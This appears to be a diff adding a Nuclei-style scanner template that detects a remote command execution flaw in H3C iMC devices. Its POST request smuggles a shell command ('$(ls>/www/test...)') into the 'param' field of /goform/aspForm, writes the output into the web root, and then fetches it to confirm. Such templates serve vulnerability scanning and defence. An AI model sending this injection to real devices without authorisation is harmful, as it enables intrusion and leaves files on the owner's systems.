@@ -1,0 +1,42 @@
+id: poc-yaml-h3c-imc-goform-aspform-rce
+info:
+  name: H3C iMC aspForm Remote Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,imc
+variables:
+  t1: "{{rand_int(10000,99999)}}"
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |
+        POST /goform/aspForm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test{{t1}});
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "H3C-Miniware-Webs"
+
+  - raw:
+      - |
+        GET /test{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "www"
+          - "etc"
+          - "home"
